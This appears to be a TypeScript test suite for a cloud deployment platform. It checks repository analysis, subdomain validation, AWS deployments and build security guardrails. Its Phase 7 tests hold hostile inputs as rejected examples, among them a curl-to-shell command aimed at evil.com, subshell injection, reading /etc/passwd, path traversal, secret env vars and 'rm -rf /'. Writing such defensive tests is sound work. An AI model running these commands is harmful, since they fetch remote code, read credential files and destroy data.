// Force dry-run in automated unit tests so we don't provision real AWS buckets on test runs
process.env.FORCE_DRY_RUN_TEST = 'true';

import assert from 'assert';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { DeploymentManager } from '../services/deploymentManager';
import { isolatedBuildRunner } from '../services/isolatedBuilder';
import { RepositoryAnalyzer } from '../services/repositoryAnalyzer';
import { securityGuardrails } from '../services/securityGuardrails';
import { selfHealingEngine } from '../services/selfHealingEngine';
import { DeploymentStore } from '../store/deploymentStore';
import {
  resolveServerControlledDomain,
  sanitizeUserEnvVars,
  validateBuildOverrides,
  validateGitHubRepoUrl,
  validateSubdomain,
} from '../utils/validation';

async function runPhase1To3Tests(): Promise<void> {
  console.log('=== Repo2Cloud Phase 1, Phase 2 & Phase 3 Verification Suite ===\n');

  // Task 2: Validate GitHub URL
  console.log('1. Testing Phase 1 (GitHub URL validation)...');
  const validRepo = validateGitHubRepoUrl('https://github.com/example/vite-app');
  assert.strictEqual(validRepo.valid, true);
  assert.strictEqual(validRepo.data?.owner, 'example');
  assert.strictEqual(validRepo.data?.repo, 'vite-app');

  assert.strictEqual(validateGitHubRepoUrl('http://github.com/example/vite-app').valid, false);
  assert.strictEqual(validateGitHubRepoUrl('https://gitlab.com/example/vite-app').valid, false);
  console.log('   ✓ GitHub URL validation passed.');

  // Phase 1 & Phase 3: Multi-Target Recommendation Engine across all 4 AWS targets
  console.log('2. Testing Phase 1 & Phase 3 (Multi-Target Recommendation Engine across 4 AWS targets)...');
  const analyzer = new RepositoryAnalyzer();

  // Target 1: S3_CLOUDFRONT (Vite + React)
  const viteResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'vite.config.ts', 'index.html'],
    packageJson: {
      name: 'vite-demo',
      scripts: { build: 'npm run build' },
      dependencies: { react: '^18.3.0' },
      devDependencies: { vite: '^5.4.0' },
    },
  });
  assert.strictEqual(viteResult.framework, 'Vite + React');
  assert.strictEqual(viteResult.buildCommand, 'npm run build');
  assert.strictEqual(viteResult.outputDirectory, 'dist');
  assert.strictEqual(viteResult.recommendedTarget, 'S3_CLOUDFRONT');
  assert.strictEqual(viteResult.targetOptions?.length, 4, 'Expected all 4 target options in Phase 3');

  // Target 2: ECS_FARGATE (Express + Dockerfile)
  const ecsResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'Dockerfile', 'server.js'],
    dockerfileContent: 'FROM node:20-alpine\nEXPOSE 8080\nCMD ["node", "server.js"]',
    packageJson: {
      name: 'express-api',
      main: 'server.js',
      scripts: { start: 'node server.js' },
      dependencies: { express: '^4.19.2' },
    },
  });
  assert.strictEqual(ecsResult.recommendedTarget, 'ECS_FARGATE');
  assert.strictEqual(ecsResult.suggestedContainerPort, 8080);
  assert.strictEqual(ecsResult.suggestedHealthCheckPath, '/health');

  // Target 3: LAMBDA_API_GATEWAY (Serverless / Lambda handler)
  const lambdaResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'serverless.yml', 'handler.js'],
    packageJson: {
      name: 'serverless-api',
      dependencies: { 'serverless-http': '^3.2.0', express: '^4.19.2' },
    },
  });
  assert.strictEqual(lambdaResult.recommendedTarget, 'LAMBDA_API_GATEWAY');
  assert.strictEqual(lambdaResult.suggestedLambdaHandler, 'handler.handler');

  // Target 4: AMPLIFY (Next.js SSR without static export)
  const amplifyResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'next.config.mjs'],
    packageJson: {
      name: 'nextjs-ssr',
      scripts: { build: 'next build', start: 'next start' },
      dependencies: { next: '^14.2.0', react: '^18.3.0' },
    },
  });
  assert.strictEqual(amplifyResult.recommendedTarget, 'AMPLIFY');
  console.log('   ✓ Phase 3 Multi-Target Recommendation Engine verified for S3_CLOUDFRONT, ECS_FARGATE, LAMBDA_API_GATEWAY, and AMPLIFY.');

  // Phase 2: Subdomain & Server-Controlled Base Domain Validation
  console.log('3. Testing Phase 2 (RFC-1123 subdomain & server-controlled domain validation)...');
  assert.strictEqual(validateSubdomain('my-app-2026').valid, true);
  assert.strictEqual(validateSubdomain('-bad-start').valid, false);
  assert.strictEqual(validateSubdomain('bad_underscore').valid, false);
  assert.strictEqual(validateSubdomain('api').valid, false, 'Reserved subdomain should be rejected');
  assert.strictEqual(validateSubdomain('a').valid, false, 'Too short subdomain should be rejected');

  assert.strictEqual(resolveServerControlledDomain('maas-fam.com').valid, true);
  assert.strictEqual(resolveServerControlledDomain('evil.com').valid, false);
  console.log('   ✓ RFC-1123 subdomain & server-controlled domain validation passed.');

  // Phase 1, Phase 2 & Phase 3 End-to-End Pipeline + Dynamic Overrides + 409 Conflict
  console.log('4. Testing Phase 1–3 Pipeline (Custom Subdomain + Dynamic Form Overrides + 409 Conflict)...');
  const tmpStoreFile = path.join(os.tmpdir(), `repo2cloud-phase3-test-${Date.now()}.json`);
  const store = new DeploymentStore(tmpStoreFile);
  const manager = new DeploymentManager(store);

  const startRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-app',
    target: 'S3_CLOUDFRONT',
    deploymentType: 'static',
    subdomain: 'technica-demo',
    domain: 'maas-fam.com',
    buildCommandOverride: 'npm run build',
    outputDirOverride: 'dist',
    envVars: { VITE_APP_ENV: 'staging' },
  });
  assert.strictEqual(startRes.ok, true);
  assert.strictEqual(startRes.deployment?.status, 'BUILDING');
  assert.strictEqual(startRes.deployment?.customHostname, 'technica-demo.maas-fam.com');
  assert.deepStrictEqual(startRes.deployment?.targetConfig?.envVarKeys, ['VITE_APP_ENV']);

  // Attempt duplicate subdomain deployment -> must return 409 Conflict immediately
  const duplicateRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/other-app',
    deploymentType: 'static',
    subdomain: 'technica-demo',
    domain: 'maas-fam.com',
  });
  assert.strictEqual(duplicateRes.ok, false);
  assert.strictEqual(duplicateRes.statusCode, 409, 'Duplicate subdomain must return 409 Conflict');
  console.log('   ✓ Atomic hostname reservation & 409 Conflict on duplicate subdomain verified.');

  const depId = startRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(depId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const completed = store.get(depId)!;
  assert.strictEqual(completed.status, 'LIVE');
  assert.strictEqual(completed.url, 'https://technica-demo.maas-fam.com');
  assert.ok(completed.infrastructureUrl?.endsWith('.cloudfront.net'));
  assert.ok(completed.resources.acmCertificateArn, 'Expected ACM certificate ARN in resources');
  assert.strictEqual(completed.resources.route53RecordName, 'technica-demo.maas-fam.com', 'Expected Route 53 Alias record in resources');

  // Test teardown releases the custom hostname reservation
  const delRes = await manager.deleteDeployment(depId);
  assert.strictEqual(delRes.ok, true);
  assert.strictEqual(store.isHostnameAvailable('technica-demo.maas-fam.com'), true, 'Hostname must be released after delete');
  console.log(`   ✓ End-to-end Phase 1–3 deployment & teardown verified (${completed.url}).`);

  // Phase 4: Containerized Full-Stack / Backend on ECS Fargate + ECR + ALB
  console.log('5. Testing Phase 4 (ECS Fargate + ECR + ALB + Auto-Dockerfile + Custom Subdomain)...');
  const ecsStartRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/express-docker-api',
    target: 'ECS_FARGATE',
    subdomain: 'express-api',
    domain: 'maas-fam.com',
    containerPort: 8080,
    healthCheckPath: '/health',
    envVars: { PORT: '8080', NODE_ENV: 'production' },
  });
  assert.strictEqual(ecsStartRes.ok, true);
  assert.strictEqual(ecsStartRes.deployment?.target, 'ECS_FARGATE');
  assert.strictEqual(ecsStartRes.deployment?.deploymentType, 'container');
  assert.strictEqual(ecsStartRes.deployment?.customHostname, 'express-api.maas-fam.com');

  const ecsDepId = ecsStartRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(ecsDepId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const ecsCompleted = store.get(ecsDepId)!;
  assert.strictEqual(ecsCompleted.status, 'LIVE', 'ECS_FARGATE deployment must reach LIVE status');
  assert.strictEqual(ecsCompleted.url, 'https://express-api.maas-fam.com');
  assert.ok(ecsCompleted.resources.ecrRepositoryUri, 'Expected ECR repository URI in resources');
  assert.ok(ecsCompleted.resources.ecsClusterName, 'Expected ECS cluster name in resources');
  assert.ok(ecsCompleted.resources.ecsServiceName, 'Expected ECS service name in resources');
  assert.ok(ecsCompleted.resources.ecsTaskDefinitionArn, 'Expected ECS task definition ARN in resources');
  assert.ok(ecsCompleted.resources.albTargetGroupArn, 'Expected ALB target group ARN in resources');
  assert.strictEqual(ecsCompleted.resources.route53RecordName, 'express-api.maas-fam.com');

  const ecsDelRes = await manager.deleteDeployment(ecsDepId);
  assert.strictEqual(ecsDelRes.ok, true);
  assert.strictEqual(ecsDelRes.deployment?.status, 'DELETED');
  assert.strictEqual(store.isHostnameAvailable('express-api.maas-fam.com'), true, 'ECS hostname must be released after delete');
  console.log(`   ✓ End-to-end Phase 4 ECS Fargate deployment & teardown verified (${ecsCompleted.url}).`);

  // Phase 5: Serverless Backend / APIs on AWS Lambda + Amazon API Gateway v2
  console.log('6. Testing Phase 5 (AWS Lambda + API Gateway v2 HTTP API + PKZIP Bundle + Custom Subdomain)...');
  const lambdaStartRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/serverless-lambda-api',
    target: 'LAMBDA_API_GATEWAY',
    subdomain: 'serverless-api',
    domain: 'maas-fam.com',
    lambdaHandler: 'handler.handler',
    runtime: 'nodejs20.x',
    envVars: { STAGE: 'prod' },
  });
  assert.strictEqual(lambdaStartRes.ok, true);
  assert.strictEqual(lambdaStartRes.deployment?.target, 'LAMBDA_API_GATEWAY');
  assert.strictEqual(lambdaStartRes.deployment?.deploymentType, 'serverless');
  assert.strictEqual(lambdaStartRes.deployment?.customHostname, 'serverless-api.maas-fam.com');

  const lambdaDepId = lambdaStartRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(lambdaDepId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const lambdaCompleted = store.get(lambdaDepId)!;
  assert.strictEqual(lambdaCompleted.status, 'LIVE', 'LAMBDA_API_GATEWAY deployment must reach LIVE status');
  assert.strictEqual(lambdaCompleted.url, 'https://serverless-api.maas-fam.com');
  assert.ok(lambdaCompleted.resources.lambdaFunctionName, 'Expected Lambda function name in resources');
  assert.ok(lambdaCompleted.resources.lambdaRoleArn, 'Expected Lambda execution role ARN in resources');
  assert.ok(lambdaCompleted.resources.apiGatewayId, 'Expected API Gateway v2 ID in resources');
  assert.ok(
    lambdaCompleted.resources.apiGatewayEndpoint?.includes('.execute-api.'),
    'Expected API Gateway v2 endpoint in resources'
  );
  assert.strictEqual(lambdaCompleted.resources.route53RecordName, 'serverless-api.maas-fam.com');

  const lambdaDelRes = await manager.deleteDeployment(lambdaDepId);
  assert.strictEqual(lambdaDelRes.ok, true);
  assert.strictEqual(lambdaDelRes.deployment?.status, 'DELETED');
  assert.strictEqual(
    store.isHostnameAvailable('serverless-api.maas-fam.com'),
    true,
    'Lambda custom hostname must be released after delete'
  );
  console.log(`   ✓ End-to-end Phase 5 Lambda + API Gateway deployment & teardown verified (${lambdaCompleted.url}).`);

  // Phase 6: Managed Full-Stack / Next.js SSR Hosting on AWS Amplify
  console.log('7. Testing Phase 6 (AWS Amplify Hosting + Auto amplify.yml + WEB_COMPUTE SSR + Custom Subdomain)...');
  const amplifyStartRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/nextjs-ssr-app',
    target: 'AMPLIFY',
    subdomain: 'nextjs-ssr',
    domain: 'maas-fam.com',
    branch: 'main',
    buildCommandOverride: 'npm run build',
    envVars: { NEXT_PUBLIC_API_URL: 'https://serverless-api.maas-fam.com' },
  });
  assert.strictEqual(amplifyStartRes.ok, true);
  assert.strictEqual(amplifyStartRes.deployment?.target, 'AMPLIFY');
  assert.strictEqual(amplifyStartRes.deployment?.deploymentType, 'amplify');
  assert.strictEqual(amplifyStartRes.deployment?.customHostname, 'nextjs-ssr.maas-fam.com');

  const amplifyDepId = amplifyStartRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(amplifyDepId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const amplifyCompleted = store.get(amplifyDepId)!;
  assert.strictEqual(amplifyCompleted.status, 'LIVE', 'AMPLIFY deployment must reach LIVE status');
  assert.strictEqual(amplifyCompleted.url, 'https://nextjs-ssr.maas-fam.com');
  assert.ok(amplifyCompleted.resources.amplifyAppId, 'Expected AWS Amplify App ID in resources');
  assert.strictEqual(amplifyCompleted.resources.amplifyBranchName, 'main', 'Expected AWS Amplify branch name in resources');
  assert.ok(
    amplifyCompleted.infrastructureUrl?.endsWith('.amplifyapp.com'),
    'Expected underlying *.amplifyapp.com URL in infrastructureUrl'
  );
  assert.strictEqual(amplifyCompleted.resources.route53RecordName, 'nextjs-ssr.maas-fam.com');

  const amplifyDelRes = await manager.deleteDeployment(amplifyDepId);
  assert.strictEqual(amplifyDelRes.ok, true);
  assert.strictEqual(amplifyDelRes.deployment?.status, 'DELETED');
  assert.strictEqual(
    store.isHostnameAvailable('nextjs-ssr.maas-fam.com'),
    true,
    'Amplify custom hostname must be released after delete'
  );
  console.log(`   ✓ End-to-end Phase 6 AWS Amplify deployment & teardown verified (${amplifyCompleted.url}).`);

  // Phase 7: Build Isolation, Security Guardrails & Cost/Resource Limits
  console.log('8. Testing Phase 7 (Command Injection, Path Traversal, Secret Stripping, Symlink Escape & Quotas)...');

  // 8a. Command injection in buildCommandOverride must be blocked
  const cmdInj1 = validateBuildOverrides({
    buildCommandOverride: 'npm run build; curl https://evil.com/shell.sh | sh',
  });
  assert.strictEqual(cmdInj1.valid, false, 'Command chaining with ; must be blocked');

  const cmdInj2 = validateBuildOverrides({
    buildCommandOverride: 'npm run $(whoami)',
  });
  assert.strictEqual(cmdInj2.valid, false, 'Subshell $(...) must be blocked');

  const cmdInj3 = validateBuildOverrides({
    buildCommandOverride: 'bash -c "cat /etc/passwd"',
  });
  assert.strictEqual(cmdInj3.valid, false, 'Arbitrary shell binary must be blocked');

  const safeCmd = validateBuildOverrides({
    buildCommandOverride: 'npm run build',
    outputDirOverride: 'dist',
    healthCheckPath: '/health',
    lambdaHandler: 'index.handler',
    containerPort: 8080,
  });
  assert.strictEqual(safeCmd.valid, true, 'Standard build overrides must be allowed');

  // 8b. Path traversal in outputDirOverride must be blocked
  assert.strictEqual(
    validateBuildOverrides({ outputDirOverride: '../../etc' }).valid,
    false,
    'Relative path traversal (..) must be blocked'
  );
  assert.strictEqual(
    validateBuildOverrides({ outputDirOverride: '/etc/passwd' }).valid,
    false,
    'Absolute path (/etc/passwd) must be blocked'
  );
  assert.strictEqual(
    validateBuildOverrides({ outputDirOverride: '.git/config' }).valid,
    false,
    '.git directory exposure must be blocked'
  );

  // 8c. AWS_* and GITHUB_* secret env vars must be blocked
  assert.strictEqual(
    sanitizeUserEnvVars({ AWS_SECRET_ACCESS_KEY: 'leak' }).valid,
    false
  );
  assert.strictEqual(
    sanitizeUserEnvVars({ AWS_CUSTOM_CREDENTIAL: 'leak' }).valid,
    false
  );
  assert.strictEqual(
    sanitizeUserEnvVars({ GITHUB_ACCESS_TOKEN: 'leak' }).valid,
    false
  );

  // 8d. Symlink escape outside workspace must be blocked
  const symlinkTestDir = path.join(os.tmpdir(), `repo2cloud-symlink-test-${Date.now()}`);
  fs.mkdirSync(symlinkTestDir, { recursive: true });
  const escapeLinkPath = path.join(symlinkTestDir, 'escaped-secret.txt');
  fs.symlinkSync('/etc/hosts', escapeLinkPath);
  let symlinkBlocked = false;
  try {
    isolatedBuildRunner.verifyWorkspaceSafety(symlinkTestDir);
  } catch (err: unknown) {
    if (err instanceof Error && err.message.includes('Symlink escape blocked')) {
      symlinkBlocked = true;
    }
  } finally {
    fs.rmSync(symlinkTestDir, { recursive: true, force: true });
  }
  assert.strictEqual(symlinkBlocked, true, 'Symlink pointing outside workspace must be blocked');

  // 8e. DeploymentManager rejects malicious overrides with 400 Bad Request
  const badDeployRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-app',
    target: 'S3_CLOUDFRONT',
    buildCommandOverride: 'npm run build && rm -rf /',
  });
  assert.strictEqual(badDeployRes.ok, false);
  assert.strictEqual(badDeployRes.statusCode, 400);

  // 8f. Security guardrails status snapshot
  const secStatus = securityGuardrails.getStatus(store);
  assert.strictEqual(secStatus.isolation.awsCredentialsStripped, true);
  assert.strictEqual(secStatus.isolation.symlinkEscapeProtection, true);
  assert.strictEqual(secStatus.isolation.commandInjectionFilter, true);
  console.log('   ✓ Phase 7 build isolation, command/path filters, symlink escape protection & quotas verified.');

  // Phase 8: Self-Healing Engine & Real-Time Platform Observability Metrics
  console.log('9. Testing Phase 8 (Self-Healing Failure Diagnosis, Auto-Remediation & Platform Observability Metrics)...');
  const diagEmptyOut = selfHealingEngine.diagnoseFailure(
    'Build finished but output directory "dist/" is empty.',
    'BUILDING'
  );
  assert.strictEqual(diagEmptyOut.errorCode, 'EMPTY_OUTPUT_DIRECTORY');
  assert.strictEqual(diagEmptyOut.autoRemediable, true);
  assert.strictEqual(diagEmptyOut.patchedAnalysis?.outputDirectory, '.');

  const diagIam = selfHealingEngine.diagnoseFailure(
    'The role defined for the function cannot be assumed by Lambda.',
    'DEPLOYING'
  );
  assert.strictEqual(diagIam.errorCode, 'TRANSIENT_CLOUD_PROPAGATION');
  assert.strictEqual(diagIam.autoRemediable, true);

  const metrics = selfHealingEngine.computeMetrics(store);
  assert.strictEqual(metrics.totalDeployments, 4, 'Expected all 4 target deployments recorded in metrics');
  assert.strictEqual(metrics.successRatePercent, 100, 'Expected 100% success rate across all 4 targets');
  assert.strictEqual(metrics.byTarget.S3_CLOUDFRONT, 1);
  assert.strictEqual(metrics.byTarget.ECS_FARGATE, 1);
  assert.strictEqual(metrics.byTarget.LAMBDA_API_GATEWAY, 1);
  assert.strictEqual(metrics.byTarget.AMPLIFY, 1);

  if (fs.existsSync(tmpStoreFile)) {
    fs.unlinkSync(tmpStoreFile);
  }
  console.log('   ✓ Phase 8 Self-Healing diagnosis & platform observability metrics verified across all 4 AWS targets.\n');
  console.log('ALL PHASE 1, PHASE 2, PHASE 3, PHASE 4, PHASE 5, PHASE 6, PHASE 7 & PHASE 8 TESTS PASSED!');
}

runPhase1To3Tests().catch((err) => {
  console.error('Test suite failed:', err);
  process.exit(1);
});
